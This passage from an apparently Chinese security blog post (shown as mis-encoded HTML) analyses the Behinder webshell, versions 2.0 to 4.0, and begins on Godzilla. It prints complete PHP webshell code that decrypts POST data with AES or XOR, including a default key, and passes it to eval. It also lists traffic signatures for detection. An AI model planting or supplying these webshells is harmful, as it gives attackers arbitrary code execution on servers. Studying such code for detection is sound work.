class="hljs-string">&#x27;pass&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// å¦‚æœå­˜åœ¨ &#x27;pass&#x27; å‚æ•°ï¼Œåˆ™è®¾ç½®ä¸€ä¸ªä¼šè¯å˜é‡ &#x27;k&#x27;</span><br>    <span class="hljs-comment">// &#x27;k&#x27; æ˜¯é€šè¿‡ md5 æ•£åˆ—å’Œ uniqid éšæœºç”Ÿæˆçš„å­—ç¬¦ä¸²çš„å­ä¸²</span><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>] = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">rand</span>())), <span class="hljs-number">16</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// å¦‚æœ &#x27;pass&#x27; å‚æ•°ä¸å­˜åœ¨ï¼Œåˆ™æ‰§è¡Œä»¥ä¸‹æ“ä½œ</span><br>    <span class="hljs-comment">// é¦–å…ˆï¼Œä½¿ç”¨ä¼šè¯å˜é‡ &#x27;k&#x27; å’Œ AES128 åŠ å¯†è§£å¯†ä» php://input è¯»å–çš„å†…å®¹</span><br>    <span class="hljs-comment">// &#x27;php://input&#x27; ç”¨äºè·å–é€šè¿‡ POST è¯·æ±‚å‘é€çš„è¾“å…¥æ•°æ®</span><br>    <span class="hljs-comment">// openssl_decrypt ç”¨äºè§£å¯†æ•°æ®ï¼Œå¦‚æœä¼šè¯å˜é‡ &#x27;k&#x27; ä¸å­˜åœ¨åˆ™å¯èƒ½äº§ç”Ÿé”™è¯¯</span><br>    <span class="hljs-comment">// æ¥ç€ï¼Œä½¿ç”¨ explode å‡½æ•°ä»¥ &#x27;|&#x27; å­—ç¬¦åˆ†å‰²è§£å¯†åçš„æ•°æ®</span><br>    <span class="hljs-comment">// æœ€åï¼Œå°è¯•è°ƒç”¨ C ç±»çš„ __invoke æ–¹æ³•ï¼Œä¼ å…¥åˆ†å‰²åæ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´ </span><br>    <span class="hljs-comment">// è¿™å¯èƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œï¼Œå› ä¸º __invoke è°ƒç”¨ eval</span><br>    <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>), <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$b</span> !== <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(), <span class="hljs-string">&#x27;__invoke&#x27;</span>))) &#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(), <span class="hljs-variable">$b</span>[<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>AESåŠ å¯†ï¼Œå¯¹æ¯”å†°è2.0å°‘äº†base64çš„è¿‡ç¨‹ã€‚</p><h2 id="å†°è20"><a href="#å†°è2-0" class="headerlink" title="å†°è2.0"></a>å†°è2.0</h2><ol><li>ä½¿ç”¨ AESåŠ å¯†+base64ç¼–ç å‘èµ·ä¸‰æ¬¡è¯·æ±‚ã€‚</li><li>ç¬¬ä¸€æ¬¡GETè¯·æ±‚æœåŠ¡ç«¯äº§ç”Ÿå¯†é’¥å†™å…¥ sessionï¼Œsession å’Œå½“å‰ä¼šè¯ç»‘å®šï¼Œä¸åŒçš„å®¢æˆ·ç«¯çš„å¯†é’¥ä¹Ÿæ˜¯ä¸åŒçš„ã€‚ç¬¬äºŒæ¬¡GETè¯·æ±‚æ˜¯ä¸ºäº†è·å–å¯†é’¥ keyï¼ŒæœåŠ¡ç«¯ä¼šç”Ÿæˆ16ä½çš„AESå¯†é’¥ã€‚ç¬¬ä¸‰æ¬¡ä½¿ç”¨ key çš„AESåŠ å¯†è¿›è¡Œé€šä¿¡ï¼Œé€šä¿¡ä¹Ÿé‡‡ç”¨äº†base64ç¼–ç ã€‚</li><li>è¿›è¡Œè¯·æ±‚æ—¶å†…ç½®äº†åå‡ ä¸ªUser-Agentå¤´ï¼Œæ¯æ¬¡è¯·æ±‚æ—¶ä¼šéšæœºé€‰æ‹©å…¶ä¸­çš„ä¸€ä¸ªã€‚å› æ­¤å½“å‘ç°ä¸€ä¸ªipçš„è¯·æ±‚å¤´ä¸­çš„user-agentåœ¨é¢‘ç¹å˜æ¢ï¼Œå°±å¯èƒ½æ˜¯å†°èã€‚</li></ol><p>shell.phpï¼Œè¿™é‡ŒåŠ ä¸Šäº†æ³¨é‡Š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// å…³é—­é”™è¯¯æŠ¥å‘Šï¼Œé¿å…è¾“å‡ºé”™è¯¯ä¿¡æ¯</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// å¼€å¯ä¼šè¯</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-comment">// æ£€æŸ¥ URL å‚æ•° &#x27;pass&#x27; æ˜¯å¦å­˜åœ¨</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// å¦‚æœå­˜åœ¨ &#x27;pass&#x27; å‚æ•°</span><br>    <span class="hljs-comment">// ç”Ÿæˆä¸€ä¸ªéšæœºçš„ MD5 æ•£åˆ—å€¼ï¼Œå¹¶å–å…¶å 16 ä¸ªå­—ç¬¦ä½œä¸ºå¯†é’¥</span><br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">rand</span>())), <span class="hljs-number">16</span>);<br>    <span class="hljs-comment">// å°†ç”Ÿæˆçš„å¯†é’¥å­˜å‚¨åœ¨ä¼šè¯å˜é‡ &#x27;k&#x27; ä¸­</span><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>] = <span class="hljs-variable">$key</span>;<br>    <span class="hljs-comment">// è¾“å‡ºå¯†é’¥</span><br>    <span class="hljs-keyword">print</span> <span class="hljs-variable">$key</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// å¦‚æœ &#x27;pass&#x27; å‚æ•°ä¸å­˜åœ¨</span><br>    <span class="hljs-comment">// ä»ä¼šè¯å˜é‡ &#x27;k&#x27; ä¸­è·å–å¯†é’¥</span><br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br>    <span class="hljs-comment">// ä» php://input è·å– POST è¯·æ±‚çš„æ•°æ®</span><br>    <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br>    <br>    <span class="hljs-comment">// æ£€æŸ¥ openssl æ‰©å±•æ˜¯å¦å·²åŠ è½½</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// å¦‚æœ openssl æ‰©å±•æœªåŠ è½½ï¼Œä½¿ç”¨åŸºäº base64 å’Œç®€å•çš„å¼‚æˆ–æ“ä½œçš„è‡ªå®šä¹‰åŠ å¯†/è§£å¯†æ–¹æ³•</span><br>        <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$post</span>);<br>        <br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>); <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-comment">// å¯¹æ¯ä¸ªå­—ç¬¦è¿›è¡Œå¼‚æˆ–æ“ä½œ</span><br>            <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] ^ <span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span> + <span class="hljs-number">1</span> &amp; <span class="hljs-number">15</span>];<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// å¦‚æœ openssl æ‰©å±•å·²åŠ è½½ï¼Œä½¿ç”¨ AES128 åŠ å¯†ç®—æ³•è¿›è¡Œè§£å¯†</span><br>        <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// ä½¿ç”¨ &#x27;|&#x27; å­—ç¬¦å°†è§£å¯†åçš„å­—ç¬¦ä¸²åˆ†å‰²ä¸ºæ•°ç»„</span><br>    <span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$post</span>);<br>    <span class="hljs-comment">// è·å–æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä½œä¸ºè¦æ‰§è¡Œçš„å‡½æ•°å</span><br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-comment">// è·å–æ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´ ä½œä¸ºå‡½æ•°å‚æ•°</span><br>    <span class="hljs-variable">$params</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br>    <br>    <span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªç±» Cï¼Œå…¶æ„é€ å‡½æ•°ä½¿ç”¨ eval æ‰§è¡Œä¼ å…¥çš„å‚æ•°</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span> . <span class="hljs-string">&quot;&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// å®ä¾‹åŒ–ç±» Cï¼Œå¹¶ä¼ å…¥å‚æ•° $paramsï¼Œè¿™å°†æ‰§è¡Œ eval</span><br>    <span class="hljs-comment">// è¿™æ˜¯éå¸¸å±é™©çš„ï¼Œå› ä¸ºå®ƒå…è®¸æ‰§è¡Œä»»æ„ PHP ä»£ç </span><br>    @<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$params</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å»æŠ“å–æµé‡åŒ…çœ‹ä¸€ä¸‹ç‰¹å¾</p><p>ç¬¬ä¸€æ¬¡è®¿é—®ç»‘å®šsession</p><p><img src="http://cdn.clown2024.cn/202407151450085.png" alt="image-20240502005646958"></p><p>ç¬¬äºŒæ¬¡è®¿é—®è·å–key</p><p><img src="http://cdn.clown2024.cn/202407151450086.png" alt="image-20240502010016480"></p><p>ç¬¬ä¸‰æ¬¡å¼€å§‹åˆ©ç”¨sessionä¸­çš„keyè¿›è¡ŒåŠ å¯†é€šä¿¡</p><p><img src="http://cdn.clown2024.cn/202407151450087.png" alt="image-20240502010147065"></p><blockquote><p>è‡³äºUAå¤´çš„æ›¿æ¢è¿™é‡Œæš‚æ—¶è¿˜æ²¡æœ‰å‘ç°</p></blockquote><p>æ›´å…·ä½“åœ°åˆ†æå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://zhuanlan.zhihu.com/p/571463343">https://zhuanlan.zhihu.com/p/571463343</a></p><h2 id="å†°è30"><a href="#å†°è3-0" class="headerlink" title="å†°è3.0"></a>å†°è3.0</h2><ol><li>ä½¿ç”¨AESåŠ å¯†+base64ç¼–ç å‘èµ·ä¸¤æ¬¡è¯·æ±‚ã€‚</li><li>å†°è3.0å–æ¶ˆäº†åŠ¨æ€å¯†é’¥è·å–çš„è¯·æ±‚ï¼ŒAESçš„å¯†é’¥ç›´æ¥å›ºå®šä¸ºè¿æ¥å¯†ç 32ä½md5çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç æ˜¯â€rebeyondâ€(å³å¯†é’¥æ˜¯md5(â€˜rebeyondâ€™)[0:16]&#x3D;e45e329feb5d925b)ã€‚æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¸å†è¿›è¡Œå¯†é’¥çš„äº¤äº’ä¼ é€’ã€‚ä¸¤æ¬¡è¯·æ±‚ä¸­ï¼Œç¬¬ä¸€æ¬¡è¯·æ±‚ç”¨äºåˆ¤æ–­æ˜¯å¦å¯ä»¥å»ºç«‹è¿æ¥ã€‚ç¬¬äºŒæ¬¡å‘é€ phpinfo ç­‰ä»£ç æ‰§è¡Œï¼Œè·å–ç½‘ç«™çš„ä¿¡æ¯ã€‚</li><li>å…¶å¯èƒ½ä½œä¸ºè¯†åˆ«ç‰¹å¾çš„æ˜¯:Content-Type:application&#x2F;octet-streamã€‚application&#x2F;octet-stream ä¸º http è§„èŒƒä¸­è¾ƒå°‘ä½¿ç”¨çš„ä¸€ç§ Content-Typeï¼Œå…¶å«ä¹‰ä¸ºåªèƒ½æäº¤äºŒè¿›åˆ¶ï¼Œè€Œä¸”åªèƒ½æäº¤ä¸€ä¸ªäºŒè¿›åˆ¶ï¼Œå¦‚æœæäº¤æ–‡ä»¶çš„è¯ï¼Œåªèƒ½æäº¤ä¸€ä¸ªæ–‡ä»¶ ï¼Œåå°æ¥æ”¶å‚æ•°åªèƒ½æœ‰ä¸€ä¸ªï¼Œè€Œä¸”åªèƒ½æ˜¯æµ (æˆ–è€…å­—èŠ‚æ•°ç»„)ã€‚</li></ol><p>shell.php</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>; <span class="hljs-comment">//è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br><span class="hljs-title function_ invoke__">session_write_close</span>();<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æŠ“æµé‡åŒ…çœ‹ä¸€ä¸‹ï¼Œè¿™é‡Œè¦AESè§£ç æ‰èƒ½çœ‹å‡ºæ¥ï¼Œæ‰¾ä¸ªåœ¨çº¿ç½‘ç«™å³å¯</p><p>ç¬¬ä¸€æ¬¡è¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ°ç›´æ¥å‘é€POSTè¯·æ±‚ï¼Œæ²¡æœ‰getäº†</p><p><img src="http://cdn.clown2024.cn/202407151450088.png" alt="image-20240502011823055"></p><h2 id="å†°è40"><a href="#å†°è4-0" class="headerlink" title="å†°è4.0"></a>å†°è4.0</h2><ol><li>æä¾›äº†ä¼ è¾“åè®®è‡ªå®šä¹‰çš„åŠŸèƒ½ï¼Œè®©ç”¨æˆ·å¯¹æµé‡çš„åŠ å¯†å’Œè§£å¯†è¿›è¡Œè‡ªå®šä¹‰ï¼Œå®ç°æµé‡åŠ è§£å¯†åè®®çš„å»ä¸­å¿ƒåŒ–ã€‚v4.0ç‰ˆæœ¬ä¸å†æœ‰è¿æ¥å¯†ç çš„æ¦‚å¿µï¼Œè‡ªå®šä¹‰ä¼ è¾“åè®®çš„ç®—æ³•å°±æ˜¯è¿æ¥å¯†ç ã€‚</li><li>Acceptå­—æ®µï¼ˆå¼±ç‰¹å¾ï¼‰ï¼Œé€šå¸¸æ˜¯Accept: application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01 æ„æ€æ˜¯æµè§ˆå™¨å¯æ¥å—ä»»ä½•æ–‡ä»¶ï¼Œä½†æœ€å€¾å‘application&#x2F;json å’Œ text&#x2F;javascriptã€‚</li><li>Content-Typeå­—æ®µï¼ˆå¼±ç‰¹å¾ï¼‰ï¼Œé€šå¸¸æ˜¯Content-type: Application&#x2F;x-www-form-urlencoded</li><li>ä¸å†°èçš„å‰è¿°ç‰ˆæœ¬ç›¸ä¼¼ï¼Œè¿›è¡Œè¯·æ±‚æ—¶å†…ç½®äº†åå‡ ä¸ªUser-Agentå¤´ï¼Œæ¯æ¬¡è¯·æ±‚æ—¶ä¼šéšæœºé€‰æ‹©å…¶ä¸­çš„ä¸€ä¸ªã€‚</li><li>è¿æ¥çš„ç«¯å£æœ‰ä¸€å®šçš„ç‰¹å¾ï¼Œå†°èä¸webshellå»ºç«‹è¿æ¥çš„åŒæ—¶ï¼Œjavawä¹Ÿä¸ç›®çš„ä¸»æœºå»ºç«‹tcpè¿æ¥ï¼Œæ¯æ¬¡è¿æ¥ä½¿ç”¨æœ¬åœ°ç«¯å£åœ¨49700å·¦å³(å°±æ˜¯æ¯”è¾ƒå¤§çš„ç«¯å£)ï¼Œæ¯è¿æ¥ä¸€æ¬¡ï¼Œæ¯å»ºç«‹ä¸€æ¬¡æ–°çš„è¿æ¥ï¼Œç«¯å£å°±ä¾æ¬¡å¢åŠ ã€‚</li><li>ä½¿ç”¨é•¿è¿æ¥ï¼Œé¿å…äº†é¢‘ç¹çš„æ¡æ‰‹é€ æˆçš„èµ„æºå¼€é”€ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯·æ±‚å¤´å’Œå“åº”å¤´é‡Œä¼šå¸¦æœ‰ Connectionï¼šKeep-Alive</li><li>æœ‰å›ºå®šçš„è¯·æ±‚å¤´å’Œå“åº”å¤´ï¼Œè¯·æ±‚å­—èŠ‚å¤´ï¼šdFAXQV1LORcHRQtLRlwMAhwFTAg&#x2F;M ï¼Œå“åº”å­—èŠ‚å¤´ï¼šTxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</li><li>é»˜è®¤æ—¶ï¼Œå†°è webshelléƒ½æœ‰â€œe45e329feb5d925bâ€ ä¸€ä¸²å¯†é’¥ï¼Œä¸å†°è3.0ç›¸åŒã€‚</li></ol><p><img src="http://cdn.clown2024.cn/202407151450089.png" alt="image-20240502020936014"></p><blockquote><p>ä¸è¿‡ä»–å¯ä»¥å…¼å®¹3.0ä½¿ç”¨å¯†ç çš„æ–¹å¼è¿æ¥ï¼Œé»˜è®¤è¿æ¥å¯†ç å’Œ3.0æ˜¯ä¸€æ ·çš„ï¼Œä¸»è¦æ˜¯çœ‹çœ‹ä»–çš„å…¶ä»–çš„ä¼ è¾“åè®®</p></blockquote><p>shell.php</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>; <span class="hljs-comment">//è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br><span class="hljs-title function_ invoke__">session_write_close</span>();<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>xså‘ç°åŠ è§£å¯†ä»£ç è¦è‡ªå·±å†™ç»“æœä¸ä¼šï¼Œé‚£å°±ä¸æ•´äº†:(ï¼Œé‚£å°±åªèƒ½ç½‘ä¸Šæ‰¾åˆ«äººçš„ä»£ç äº†ï¼Œè¿™é‡Œæ‰¾åˆ°ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/11942?time__1311=mqmx0DBG0QdxyDBuex2lfD8DcGD9ngOWYD&alichlgref=https://www.google.com/">https://xz.aliyun.com/t/11942?time__1311=mqmx0DBG0QdxyDBuex2lfD8DcGD9ngOWYD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><p><img src="http://cdn.clown2024.cn/202407151450090.png" alt="image-20240502020538191"></p><p>é€‰æ‹©ä¼ è¾“åè®®ï¼Œå†™å¥½å¯¹åº”çš„åŠ è§£å¯†å‡½æ•°ï¼Œç„¶åæœ¬åœ°ç”ŸæˆæœåŠ¡ç«¯ï¼Œå°±ä¼šç”Ÿæˆå„ç§å¯¹åº”çš„shellæ–‡ä»¶ï¼Œä¸Šä¼ ç„¶åè¿æ¥å³å¯ã€‚</p><p>4.0ç‰ˆæœ¬ç»™æˆ‘ä»¬è‡ªç”±å‘æŒ¥ç©ºé—´ä¹Ÿå¾ˆå¤šï¼Œå¯ä»¥è¿›è¡Œé­”æ”¹æˆè‡ªå·±æƒ³è¦çš„ä¼ è¾“æ–¹å¼ï¼Œè¿™é‡Œæœ‰ä¸€ç¯‡å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/12453?time__1311=mqmhD5AKYI1GODlxGoUDyjDnmtDkzlGzteD&alichlgref=https://www.google.com/">https://xz.aliyun.com/t/12453?time__1311=mqmhD5AKYI1GODlxGoUDyjDnmtDkzlGzteD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><p>å…·ä½“çš„åˆ†æä¹Ÿä¸æ¼”ç¤ºäº†ï¼Œè¿™é‡Œåªæ˜¯å…ˆå¤§è‡´äº†è§£ï¼Œæ·±å…¥çš„ä¹‹åå†å­¦ä¹ ã€‚(ä¸»è¦æ˜¯æ‡’)</p><h1 id="å“¥æ–¯æ‹‰"><a href="#å“¥æ–¯æ‹‰" class="headerlink" title="å“¥æ–¯æ‹‰"></a>å“¥æ–¯æ‹‰</h1><p>å“¥æ–¯æ‹‰æ˜¯ä¸€ä¸ªåŸºäºæµé‡ã€HTTP å…¨åŠ å¯†çš„ Webshellç®¡ç†å·¥å…·ã€‚å’Œå†°èç±»ä¼¼ï¼Œå“¥æ–¯æ‹‰ä¸ºåŠ å¯†çš„é€šè®¯æµé‡ï¼Œå› æ­¤é€šè¿‡æµé‡è¿›è¡Œæ£€æµ‹ä¼šæœ‰å¾ˆå¤§çš„éš¾åº¦ï¼Œç”±äº WAF ç­‰æµé‡æ£€æµ‹å‹å®‰å…¨è®¾å¤‡æ— æ³•å¯¹åŠ å¯†çš„æµé‡è¿›è¡Œè§£å¯†ï¼Œå› æ­¤åªèƒ½é‡‡ç”¨ä¸€äº›æ¯”è¾ƒå®½æ³›çš„åŒ¹é…è§„åˆ™è¿›è¡Œæ£€æµ‹ã€‚å¦‚å“¥æ–¯æ‹‰å®¢æˆ·ç«¯ä½¿ç”¨JAVA è¯­è¨€ç¼–å†™ï¼Œåœ¨é»˜è®¤çš„æƒ…å†µä¸‹ï¼Œå¦‚æœä¸ä¿®æ”¹ User-Agentï¼ŒUser-Agent ä¼šåŒ…å«Java 